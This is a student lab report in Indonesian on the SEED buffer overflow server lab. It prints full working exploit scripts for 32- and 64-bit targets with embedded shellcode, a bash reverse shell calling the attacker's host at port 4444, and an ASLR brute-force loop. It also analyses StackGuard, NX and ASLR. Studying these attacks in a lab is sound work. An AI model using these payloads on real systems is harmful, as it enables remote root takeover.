# B2 – Buffer Overflow Attack Lab (Server Version)

## Tujuan
Tujuan dari praktikum ini adalah untuk memahami kerentanan **buffer overflow** pada program yang berjalan di server dan cara mengeksploitasinya untuk mendapatkan akses root. Lab ini mencakup topik: stack layout, shellcode injection, return address manipulation, reverse shell, serta evaluasi countermeasures (ASLR, StackGuard, Non-executable Stack).

## Environment
* **OS:** SEED Ubuntu 20.04 VM
* **Tools:** `gcc`, `python3`, `nc` (netcat), `docker`, `docker-compose`
* **Target Servers:**
  * Level 1: `10.9.0.5:9090` (32-bit, hint: ebp + buf_addr)
  * Level 2: `10.9.0.6:9090` (32-bit, hint: buf_addr only)
  * Level 3: `10.9.0.7:9090` (64-bit, hint: rbp + buf_addr)
  * Level 4: `10.9.0.8:9090` (64-bit, buffer kecil)

---

## Setup – Persiapan Lingkungan

### Langkah
1. Matikan Address Space Layout Randomization (ASLR).
   ```bash
   sudo /sbin/sysctl -w kernel.randomize_va_space=0
   ```
2. Download dan ekstrak Labsetup.
   ```bash
   wget https://seedsecuritylabs.org/Labs_20.04/Files/Buffer_Overflow_Server/Labsetup.zip
   unzip Labsetup.zip
   cd Labsetup
   ```
3. Compile vulnerable program dengan StackGuard OFF dan executable stack ON.
   ```bash
   cd server-code
   make
   make install
   cd ..
   ```
4. Build dan jalankan Docker containers.
   ```bash
   docker-compose build
   docker-compose up
   ```
5. Verifikasi koneksi ke server Level-1.
   ```bash
   echo hello | nc 10.9.0.5 9090
   ```

### Dokumentasi Output
[Bukti: Foto Setup-1] – Output hello ke server (menampilkan ebp dan buf_addr)

### Analisis
Lingkungan lab menggunakan empat Docker container yang masing-masing menjalankan versi program `stack` yang berbeda tingkat kesulitannya. Program `stack.c` memiliki kerentanan buffer overflow karena menggunakan `strcpy()` tanpa batas ke buffer kecil (`BUF_SIZE` 100–400 byte), sementara input dari user bisa sampai 517 byte. Server (`server.c`) meneruskan koneksi TCP dari port 9090 sebagai stdin ke program `stack`, sehingga attacker dapat mengirim payload dari jarak jauh. Kompilasi dilakukan dengan `-fno-stack-protector` (mematikan StackGuard) dan `-z execstack` (mengaktifkan executable stack) agar serangan dapat berhasil.

---

## Task 1 – Modifikasi Shellcode

### Langkah
1. Generate shellcode binary dari Python script.
   ```bash
   cd shellcode
   ./shellcode_32.py > codefile_32
   ./shellcode_64.py > codefile_64
   make
   ```
2. Test shellcode default 32-bit.
   ```bash
   ./a32.out
   ```
   Shellcode bawaan menjalankan command: `/bin/ls -l; echo Hello; /bin/tail -n 2 /etc/passwd`.
3. Modifikasi shellcode 32-bit untuk **reverse shell**. Buka `shellcode_32.py`, ganti command string (panjang harus **TETAP SAMA** seperti aslinya — gunakan spasi tambahan untuk menyesuaikan).
   ```python
   original = "/bin/ls -l; echo Hello; /bin/tail -n 2 /etc/passwd"
   print(len(original))  # 52

   new_cmd = "/bin/bash -i > /dev/tcp/10.0.2.4/4444 0<&1 2>&1   "
   print(len(new_cmd))   # 52
   ```
4. Generate ulang dan test shellcode yang dimodifikasi.
   ```bash
   ./shellcode_32.py > codefile_32
   ./a32.out
   ```

### Kode shellcode_32.py yang Dimodifikasi
```python
#!/usr/bin/env python3
import sys

shellcode = (
  "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
  "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
  "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
  "/bin/bash*"
  "-c*"
  "/bin/bash -i > /dev/tcp/10.0.2.4/4444 0<&1 2>&1   "
  "AAAA"
  "BBBB"
  "CCCC"
  "DDDD"
).encode('latin-1')
```

### Dokumentasi Output
[Bukti: Foto 1a] – Output `a32.out` dengan shellcode asli (menjalankan ls, echo, tail)
[Bukti: Foto 1b] – Output `a32.out` dengan shellcode reverse shell (terhubung ke listener)

### Analisis
Shellcode adalah potongan kode assembly yang di-encode menjadi byte string untuk diinjeksi ke dalam stack program korban. Shellcode bawaan menjalankan `/bin/bash -c "<command>"` di mana command string terdefinisi di dalam shellcode. Dengan mengganti command string menjadi reverse shell (`/bin/bash -i > /dev/tcp/IP/PORT 0<&1 2>&1`), shell yang didapatkan di server target akan menghubungkan stdin, stdout, dan stderr-nya kembali ke attacker melalui koneksi TCP, sehingga attacker bisa mengontrol shell dari jarak jauh. **Syarat krusial:** panjang command string tidak boleh berubah karena offset array `argv[]` di-hardcode di binary shellcode — gunakan spasi tambahan atau pengurangan untuk menyesuaikan panjang.

---

## Task 2 – Level-1 Attack (32-bit, Hint Lengkap)

### Langkah
1. Dapatkan informasi alamat dari server Level-1.
   ```bash
   echo hello | nc 10.9.0.5 9090
   ```
   Output dari server:
   ```
   ebp: 0xffffdb88
   buf_addr: 0xffffdb18
   ```
2. Hitung offset dari buffer ke return address.
   ```
   offset = (ebp - buf_addr) + 4
          = (0xffffdb88 - 0xffffdb18) + 4
          = 0x70 + 4 = 116 byte
   ```
3. Jalankan **listener** reverse shell di terminal terpisah.
   ```bash
   nc -nv -l 4444
   ```
4. Buat exploit script `exploit_task2.py` dan jalankan.
   ```bash
   python3 exploit_task2.py
   cat badfile | nc 10.9.0.5 9090
   ```
5. Verifikasi reverse shell berhasil — ketik `id` dan `whoami` di terminal listener.

### Kode exploit_task2.py
```python
#!/usr/bin/env python3
import sys

shellcode = (
  "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
  "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
  "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
  "/bin/bash*"
  "-c*"
  "/bin/bash -i > /dev/tcp/10.0.2.4/4444 0<&1 2>&1   "
  "AAAA"
  "BBBB"
  "CCCC"
  "DDDD"
).encode('latin-1')

content = bytearray(0x90 for i in range(517))
content[0:len(shellcode)] = shellcode

buf_addr = 0xffffdb18
ebp      = 0xffffdb88

offset = (ebp - buf_addr) + 4
ret    = buf_addr

content[offset:offset + 4] = (ret).to_bytes(4, byteorder='little')

with open('badfile', 'wb') as f:
    f.write(content)

print(f"[*] buf_addr = 0x{buf_addr:08x}")
print(f"[*] ebp      = 0x{ebp:08x}")
print(f"[*] offset   = {offset}")
print(f"[*] ret_addr = 0x{ret:08x}")
```

### Dokumentasi Output
[Bukti: Foto 2a] – Output `echo hello | nc 10.9.0.5 9090` menampilkan ebp dan buf_addr
[Bukti: Foto 2b] – Output `python3 exploit_task2.py` (nilai offset dan return address)
[Bukti: Foto 2c] – Terminal listener menerima reverse shell, output `id` dan `whoami` menunjukkan `root`

### Analisis
Pada Level-1, server memberikan dua informasi penting: alamat buffer (`buf_addr`) dan nilai frame pointer (`ebp`). Dengan kedua informasi ini, offset dari buffer ke return address dapat dihitung secara presisi menggunakan rumus `(ebp - buf_addr) + 4`. Angka 4 adalah ukuran saved ebp (1 word = 4 byte pada 32-bit) — return address terletak tepat di atas saved ebp. Seluruh payload (517 byte) diisi dengan NOP sled (`0x90`) agar eksekusi "meluncur" menuju shellcode. Return address di-offset ditimpa dengan `buf_addr` sehingga saat fungsi `bof()` menjalankan instruksi `ret`, aliran eksekusi akan melompat ke awal buffer tempat shellcode berada. Karena server berjalan dengan privilege root (Set-UID), shell yang diperoleh juga memiliki akses root penuh.

---

## Task 3 – Level-2 Attack (32-bit, Tanpa Hint EBP)

### Langkah
1. Dapatkan informasi dari server Level-2.
   ```bash
   echo hello | nc 10.9.0.6 9090
   ```
   Output:
   ```
   buf_addr: 0xffffda3c
   ```
   Server hanya memberikan **buf_addr** (tanpa ebp), jadi offset ke return address tidak bisa dihitung langsung.
2. Gunakan strategi **NOP sled spraying**: semprot return address di seluruh kemungkinan offset (range buffer 100–300 byte), arahkan ke area tengah NOP sled.
3. Jalankan exploit.
   ```bash
   python3 exploit_task3.py
   cat badfile | nc 10.9.0.6 9090
   ```

### Kode exploit_task3.py
```python
#!/usr/bin/env python3
import sys

shellcode = (
  "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
  "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
  "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
  "/bin/bash*"
  "-c*"
  "/bin/bash -i > /dev/tcp/10.0.2.4/4444 0<&1 2>&1   "
  "AAAA"
  "BBBB"
  "CCCC"
  "DDDD"
).encode('latin-1')

content = bytearray(0x90 for i in range(517))

buf_addr = 0xffffda3c

shellcode_offset = 517 - len(shellcode)
content[shellcode_offset:shellcode_offset + len(shellcode)] = shellcode

ret = buf_addr + 100

for offset in range(100, 300, 4):
    content[offset:offset + 4] = (ret).to_bytes(4, byteorder='little')

with open('badfile', 'wb') as f:
    f.write(content)

print(f"[*] buf_addr     = 0x{buf_addr:08x}")
print(f"[*] ret (target) = 0x{ret:08x}")
```

### Dokumentasi Output
[Bukti: Foto 3a] – Output `echo hello | nc 10.9.0.6 9090` (hanya buf_addr, tanpa ebp)
[Bukti: Foto 3b] – Output `python3 exploit_task3.py`
[Bukti: Foto 3c] – Reverse shell berhasil di terminal listener

### Analisis
Tanpa mengetahui nilai `ebp`, offset pasti ke return address tidak dapat dihitung. Strategi **NOP sled spraying** digunakan: seluruh payload 517 byte dipenuhi instruksi NOP (`0x90`), shellcode diletakkan di akhir payload (agar tidak tertimpa oleh return address yang disemprot), dan return address (4 byte) ditulis di **setiap kemungkinan offset** dalam rentang 100–300 byte (range ukuran buffer yang diketahui). Return address diarahkan ke `buf_addr + 100` — area di tengah NOP sled yang aman. Ketika fungsi `return`, setidaknya satu salinan return address akan tepat menimpa saved return address asli, dan eksekusi akan melompat ke NOP sled yang akan "meluncur" (slide) hingga mencapai shellcode. Ini adalah teknik **single payload** yang bekerja untuk berbagai ukuran buffer tanpa brute-force — payload dikirim sekali dan pasti berhasil.

---

## Task 4 – Level-3 Attack (64-bit, Hint Lengkap)

### Langkah
1. Dapatkan informasi dari server Level-3.
   ```bash
   echo hello | nc 10.9.0.7 9090
   ```
   Output:
   ```
   rbp: 0x7fffffffe1b0
   buf_addr: 0x7fffffffe070
   ```
2. Gunakan shellcode **64-bit** dari `shellcode_64.py` (bukan 32-bit).
3. **Tantangan:** Address 64-bit mengandung null byte (`0x00`) di 2 byte tertinggi. `strcpy()` berhenti di null byte → tempatkan return address di **akhir payload**.
4. Jalankan exploit.
   ```bash
   python3 exploit_task4.py
   cat badfile | nc 10.9.0.7 9090
   ```

### Kode exploit_task4.py
```python
#!/usr/bin/env python3
import sys

shellcode_64 = (
  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
  "\x2f\x62\x61\x73\x68\x50\x48\x89\xe7\x52"
  "\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
  "/bin/bash*"
  "-c*"
  "/bin/bash -i > /dev/tcp/10.0.2.4/4444 0<&1 2>&1     "
  "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD"
).encode('latin-1')

content = bytearray(0x90 for i in range(517))
content[0:len(shellcode_64)] = shellcode_64

buf_addr = 0x7fffffffe070
rbp      = 0x7fffffffe1b0

offset = (rbp - buf_addr) + 8
ret    = buf_addr

content[offset:offset + 8] = (ret).to_bytes(8, byteorder='little')

with open('badfile', 'wb') as f:
    f.write(content)

print(f"[*] buf_addr = 0x{buf_addr:016x}")
print(f"[*] rbp      = 0x{rbp:016x}")
print(f"[*] offset   = {offset}")
print(f"[*] ret_addr = 0x{ret:016x}")
```

### Dokumentasi Output
[Bukti: Foto 4a] – Output `echo hello | nc 10.9.0.7 9090` menampilkan rbp dan buf_addr (64-bit)
[Bukti: Foto 4b] – Output `python3 exploit_task4.py`
[Bukti: Foto 4c] – Reverse shell berhasil di terminal listener

### Analisis
Serangan pada arsitektur 64-bit lebih menantang karena dua alasan: (1) address sepanjang **8 byte**, dan (2) dua byte tertinggi address selalu **0x00** (karena arsitektur x64 hanya menggunakan 48-bit address space). `strcpy()` akan berhenti saat menemui byte `0x00`, sehingga jika return address (yang mengandung null byte di atas) ditempatkan sebelum shellcode, shellcode tidak akan tersalin. Hanya 6 byte pertama address yang bermakna. **Little-endian** menyelamatkan: byte terkecil address diletakkan lebih dulu di memori, dan byte `0x00` berada di urutan ke-7 dan ke-8 (paling belakang). Dengan menempatkan return address di **akhir payload** (offset tinggi), null byte hanya muncul setelah semua shellcode dan NOP sled tersalin sempurna. Offset ke return address menggunakan `+8` (8 byte = 1 word 64-bit) bukan `+4` seperti pada 32-bit.

---

## Task 5 – Level-4 Attack (64-bit, Buffer Kecil)

### Langkah
1. Dapatkan informasi dari server Level-4.
   ```bash
   echo hello | nc 10.9.0.8 9090
   ```
   Output:
   ```
   rbp: 0x7fffffffe1b0
   buf_addr: 0x7fffffffe190
   ```
   Jarak buffer ke rbp = `0x7fffffffe1b0 - 0x7fffffffe190` = **32 byte** — terlalu kecil untuk shellcode + NOP sled.
2. **Strategi:** Letakkan shellcode **SETELAH return address** (di area stack yang lebih tinggi). Return address diarahkan **ke atas** menuju area NOP sled + shellcode.
3. Jalankan exploit.
   ```bash
   python3 exploit_task5.py
   cat badfile | nc 10.9.0.8 9090
   ```

### Kode exploit_task5.py
```python
#!/usr/bin/env python3
import sys

shellcode_64 = (
  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
  "\x2f\x62\x61\x73\x68\x50\x48\x89\xe7\x52"
  "\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
  "/bin/bash*"
  "-c*"
  "/bin/bash -i > /dev/tcp/10.0.2.4/4444 0<&1 2>&1     "
  "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD"
).encode('latin-1')

content = bytearray(0x90 for i in range(517))

buf_addr = 0x7fffffffe190
rbp      = 0x7fffffffe1b0

offset = (rbp - buf_addr) + 8

for i in range(offset + 8, 517):
    content[i] = 0x90

shellcode_start = offset + 8 + 100
content[shellcode_start:shellcode_start + len(shellcode_64)] = shellcode_64

ret = buf_addr + offset + 8 + 50

content[offset:offset + 8] = (ret).to_bytes(8, byteorder='little')

with open('badfile', 'wb') as f:
    f.write(content)

print(f"[*] buf_addr     = 0x{buf_addr:016x}")
print(f"[*] rbp          = 0x{rbp:016x}")
print(f"[*] offset       = {offset}")
print(f"[*] ret (target) = 0x{ret:016x}")
```

### Dokumentasi Output
[Bukti: Foto 5a] – Output `echo hello | nc 10.9.0.8 9090` (buffer sangat kecil, jarak rbp–buf ~32 byte)
[Bukti: Foto 5b] – Output `python3 exploit_task5.py`
[Bukti: Foto 5c] – Reverse shell berhasil di terminal listener

### Analisis
Level-4 mensimulasikan skenario paling sulit: ukuran buffer sangat kecil (20–80 byte) yang tidak cukup menampung NOP sled dan shellcode. Strategi **"melompat ke belakang"** digunakan — shellcode ditempatkan di area payload yang posisinya **melewati return address** (di alamat stack yang lebih tinggi dari saved rbp). Karena `strcpy()` akan terus menulis hingga 517 byte (jauh melebihi ukuran buffer asli yang hanya ~32 byte), area stack di atas frame `bof()` — termasuk saved rbp dari `main()` dan return address milik `main()` — ikut tertimpa. Return address dimodifikasi untuk menunjuk ke area NOP sled di atas, bukan ke dalam buffer kecil. Teknik ini menunjukkan bahwa buffer overflow tidak terbatas pada penulisan di dalam buffer saja — seluruh area stack di atas buffer sampai batas input (517 byte) dapat ditimpa dan dimanfaatkan.

---

## Task 6 – Eksperimen Address Space Layout Randomization (ASLR)

### Langkah
1. Aktifkan ASLR.
   ```bash
   sudo /sbin/sysctl -w kernel.randomize_va_space=2
   ```
2. Kirim pesan "hello" ke server Level-1 **berkali-kali** dan amati alamat yang berubah.
   ```bash
   echo hello | nc 10.9.0.5 9090
   echo hello | nc 10.9.0.5 9090
   echo hello | nc 10.9.0.5 9090
   ```
   Hasil 3 kali run (contoh):
   ```
   run 1: buf_addr=0xffffd718, ebp=0xffffd788
   run 2: buf_addr=0xffffc328, ebp=0xffffc398
   run 3: buf_addr=0xffffdaa8, ebp=0xffffdb18
   ```
   Terlihat alamat berubah-ubah tiap koneksi.
3. Kirim pesan "hello" ke server Level-3 **berkali-kali**.
   ```bash
   echo hello | nc 10.9.0.7 9090
   echo hello | nc 10.9.0.7 9090
   echo hello | nc 10.9.0.7 9090
   ```
4. Lakukan **brute-force attack** pada Level-1 (32-bit) dengan script bash.
   ```bash
   chmod +x brute_force.sh
   ./brute_force.sh
   ```

### Script brute_force.sh
```bash
#!/bin/bash
SECONDS=0
value=0
while true; do
    value=$(( $value + 1 ))
    duration=$SECONDS
    min=$(($duration / 60))
    sec=$(($duration % 60))
    echo "$min menit $sec detik berlalu."
    echo "Program telah berjalan $value kali sejauh ini."
    cat badfile | nc 10.9.0.5 9090
done
```

### Dokumentasi Output
[Bukti: Foto 6a] – Output hello SEBELUM ASLR (alamat statis, tidak berubah)
[Bukti: Foto 6b] – Output hello SESUDAH ASLR, tiga kali percobaan (alamat berubah-ubah tiap koneksi)
[Bukti: Foto 6c] – Brute-force berhasil: reverse shell didapatkan setelah ±X menit percobaan

### Analisis
Setelah ASLR diaktifkan (`randomize_va_space=2`), setiap koneksi ke server menghasilkan alamat buffer dan frame pointer yang **berbeda-beda secara acak**. Ini terjadi karena kernel Linux mengacak posisi stack setiap kali program dieksekusi (tepatnya setiap kali `execve()` dipanggil). Pada sistem **32-bit**, hanya **19 bit** yang digunakan untuk randomisasi alamat stack (karena keterbatasan ruang alamat 32-bit), sehingga ruang kemungkinan hanya 2^19 = 524.288 kemungkinan. Dengan brute-force yang terus-menerus mengirim payload menggunakan alamat yang sama, peluang berhasil dalam ~10 menit cukup tinggi (sekitar 1 dari 524.288 per percobaan, dengan ribuan percobaan per menit). Sebaliknya, pada sistem **64-bit**, jumlah bit yang di-random jauh lebih besar (sekitar 28–30 bit), menghasilkan miliaran kemungkinan — brute-force menjadi tidak praktis. Inilah mengapa ASLR jauh lebih efektif pada arsitektur 64-bit.

---

## Task 7 – Eksperimen Countermeasures: StackGuard dan Non-executable Stack

### Task 7.a – StackGuard Protection

#### Langkah
1. Compile ulang `stack.c` **TANPA** flag `-fno-stack-protector` (StackGuard aktif).
   ```bash
   cd server-code
   gcc -DBUF_SIZE=100 -o stack-L1 -z execstack stack.c
   ```
2. Jalankan program langsung (bukan lewat container) dengan input dari badfile.
   ```bash
   ./stack-L1 < badfile
   ```

#### Dokumentasi Output
[Bukti: Foto 7a] – Output terminal: `*** stack smashing detected ***: terminated` / `Aborted (core dumped)`

#### Analisis
StackGuard adalah mekanisme keamanan compiler (GCC) yang menempatkan **canary value** — sebuah nilai acak (random) — di stack tepat di antara buffer lokal dan saved return address. Sebelum fungsi melakukan `return`, canary diperiksa: jika nilainya berubah (karena buffer overflow menimpa area tersebut), program langsung mendeteksi **stack smashing** dan memanggil `abort()` untuk menghentikan eksekusi. Saat kompilasi dengan `-fno-stack-protector`, mekanisme ini dinonaktifkan. Tanpa flag tersebut, StackGuard aktif secara default di GCC modern, sehingga eksploitasi buffer overflow konvensional tidak dapat menimpa return address tanpa terdeteksi.

---

### Task 7.b – Non-executable Stack (NX Bit)

#### Langkah
1. Compile `call_shellcode.c` **TANPA** flag `-z execstack` (stack menjadi non-executable).
   ```bash
   cd shellcode
   gcc -o a32.out call_shellcode.c -m32
   gcc -o a64.out call_shellcode.c
   ```
2. Jalankan program.
   ```bash
   ./a32.out
   ```

#### Dokumentasi Output
[Bukti: Foto 7b] – Output terminal: `Segmentation fault (core dumped)`

#### Analisis
Dengan non-executable stack, halaman memori stack ditandai dengan **NX bit (No-eXecute)** di page table. Flag kompilasi `-z execstack` membuat stack executable, sedangkan tanpa flag tersebut (default GCC modern) stack bersifat non-executable. Saat CPU mencoba mengeksekusi instruksi yang berada di halaman memori bertanda NX (dalam hal ini shellcode di stack), hardware akan menolak dan menghasilkan segmentation fault. Mekanisme ini **mencegah eksekusi shellcode yang diinjeksi ke stack**, namun **tidak mencegah buffer overflow itu sendiri** dan tidak mencegah penimpaan return address. Attacker dapat mengalahkan perlindungan ini dengan teknik **Return-to-Libc (ret2libc)** atau **Return-Oriented Programming (ROP)** yang memanfaatkan potongan kode (gadget) yang sudah ada di library/system, tanpa perlu mengeksekusi kode baru dari stack.

---

## Kesimpulan Umum
Lab ini mendemonstrasikan berbagai aspek eksploitasi buffer overflow pada aplikasi server serta evaluasi efektivitas countermeasures modern. Kesimpulan utama:

1. **Buffer overflow** terjadi ketika program menulis data melebihi kapasitas buffer stack. Dengan menimpa return address, attacker dapat mengalihkan aliran eksekusi ke shellcode yang diinjeksi, menghasilkan shell dengan privilege proses korban (dalam lab ini: root).

2. **Informasi alamat memori** (buffer address dan frame pointer) sangat kritis dalam menyusun exploit yang presisi. Tanpa informasi lengkap, teknik **NOP sled spraying** dapat digunakan untuk memperluas "zona pendaratan" return address, memungkinkan satu payload bekerja untuk berbagai ukuran buffer.

3. **Reverse shell** memungkinkan attacker mengendalikan shell target dari jarak jauh dengan me-redirect stdin, stdout, dan stderr melalui koneksi TCP kembali ke mesin attacker menggunakan command `/bin/bash -i > /dev/tcp/IP/PORT 0<&1 2>&1`.

4. **Arsitektur 64-bit** menambah kompleksitas karena null byte (`0x00`) dalam address memutus `strcpy()`. Solusinya adalah memanfaatkan little-endian dan menempatkan return address di akhir payload agar null byte tidak menghalangi penyalinan shellcode.

5. **Countermeasures** yang dievaluasi:
   - **ASLR (Address Space Layout Randomization):** Mengacak alamat stack setiap eksekusi, sangat efektif pada 64-bit (28–30 bit random), namun pada 32-bit (hanya 19 bit) masih dapat di-brute-force dalam waktu singkat.
   - **StackGuard (Canary):** Mendeteksi modifikasi stack sebelum fungsi return, mencegah penimpaan return address tanpa terdeteksi. Efektif untuk buffer overflow stack-based sederhana.
   - **Non-executable Stack (NX):** Mencegah eksekusi kode dari stack, namun dapat diakali dengan teknik ret2libc / ROP yang menggunakan kode yang sudah ada di memori.

6. **Pertahanan berlapis (defense in depth)** — kombinasi ASLR + StackGuard + NX + compiler hardening (PIE, RELRO, FORTIFY_SOURCE) — memberikan perlindungan yang jauh lebih kuat dibandingkan hanya mengandalkan satu mekanisme tunggal.
